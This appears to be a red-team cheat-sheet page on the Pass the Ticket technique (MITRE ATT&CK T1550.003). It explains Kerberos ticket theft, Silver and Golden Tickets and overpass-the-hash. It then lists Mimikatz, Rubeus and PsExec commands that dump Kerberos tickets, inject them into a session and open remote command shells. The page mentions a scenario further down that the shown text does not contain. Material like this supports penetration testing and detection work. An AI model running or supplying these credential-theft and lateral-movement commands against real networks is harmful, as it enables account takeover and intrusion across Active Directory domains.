### T1550.003: Pass The Ticket

**Permissions Required: **<mark style="color:red;">**Administrator**</mark>** | **<mark style="color:green;">**User**</mark>

**Description**

Adversaries may "pass the ticket" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

When preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.

A Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).

A Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.

Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, "overpassing the hash" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.

## Techniques

A scenario is shown further down this document in order to expand on the techniques shown below.

### Mimikatz

**Github (PowerShell) **<mark style="color:red;">**\<WIP>**</mark>

```powershell
# Collect tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Inject ticket
Invoke-Mimikatz -Command '"kerberos::ptt <.kirbi file>"'

# spawn CMD with the injected ticket
Invoke-Mimikatz -Command '"misc::cmd"'
```

### Rubeus

```bash
# Collect tickets
.\Rubeus.exe dump /nowrap

# Monitor for new tickets
.\Rubeus.exe monitor /interval:5 /nowrap

# Inject ticket kirbi file
.\Rubeus.exe ptt /ticket:<.kirbi file>

# Inject ticket base64 blob
.\Rubeus.exe ptt /ticket:<Base64Blob>
```

### PsExec

```bash
# To be used after injecting ticket with either Rubeus or Mimikatz
.\PsExec.exe -accepteula \\<IP> cmd
```
